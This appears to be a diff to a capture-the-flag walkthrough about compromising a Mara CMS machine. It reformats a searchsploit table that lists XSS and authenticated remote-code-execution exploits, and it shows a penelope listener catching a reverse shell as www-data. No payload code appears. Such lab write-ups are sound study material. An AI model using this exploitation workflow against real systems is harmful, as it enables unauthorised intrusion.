@@ -86,14 +86,14 @@ So, the path leads us to Mara CMS. We don't know the exact version, but we know 
 
 ```bash
 kali@kali:searchsploit mara cms                                                                                                                 
---------------------------------------------------------------------------------------------------- -----------------------
- Exploit Title                                                                                     |  Path
---------------------------------------------------------------------------------------------------- -----------------------
-Elxis CMS 2009 - 'administrator/index.php' URI Cross-Site Scripting                                | php/webapps/36407.txt
-Elxis CMS 2009 - 'index.php?task' Cross-Site Scripting                                             | php/webapps/36406.txt
-Mara CMS  7.5 - Reflective Cross-Site Scripting                                                    | php/webapps/48777.txt
-Mara CMS 7.5 - Remote Code Execution (Authenticated)                                               | php/webapps/48780.txt
---------------------------------------------------------------------------------------------------- -----------------------
+----------------------------------------------------------------------------------- -----------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- -----------------------
+Elxis CMS 2009 - 'administrator/index.php' URI Cross-Site Scripting                | php/webapps/36407.txt
+Elxis CMS 2009 - 'index.php?task' Cross-Site Scripting                             | php/webapps/36406.txt
+Mara CMS  7.5 - Reflective Cross-Site Scripting                                    | php/webapps/48777.txt
+Mara CMS 7.5 - Remote Code Execution (Authenticated)                               | php/webapps/48780.txt
+----------------------------------------------------------------------------------- -----------------------
 Shellcodes: No Results
 ```
 
@@ -138,7 +138,7 @@ kali@kali:penelope -p 4444
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12
 [+] Logging to /home/kali/.penelope/sessions/ubuntu-xenial~10.49.140.184-Linux-x86_64/2026_02_16-13_45_00-794.log 📜
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-www-data@ubuntu-xenial:/$ 
+www-data@ubuntu-xenial:/$
 ```
 
 We got a reverse shell as user www-data.
